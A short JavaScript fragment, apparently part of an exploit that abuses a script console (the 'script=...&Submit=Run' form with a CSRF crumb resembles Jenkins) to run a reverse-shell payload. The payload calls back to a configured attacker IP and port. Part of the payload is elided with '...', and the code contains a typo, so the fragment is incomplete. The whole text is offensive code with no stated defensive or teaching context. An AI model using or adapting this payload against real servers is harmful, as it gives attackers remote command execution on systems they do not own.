let attackers_ip = "127.0.0.1";
let attackers_port = "443";
...
p.exitValue();break;}catch(Exception e){}};p.destory();s.close();")

let crumb_name = document.head.getAttribute("data-crumb-header");
let crumb_value = document.head.getAttribute("data-crumb-value");

let body_val="script="+reverse_payload+'&'+crumb_name+'='+crumb_value+"&Submit=Run";
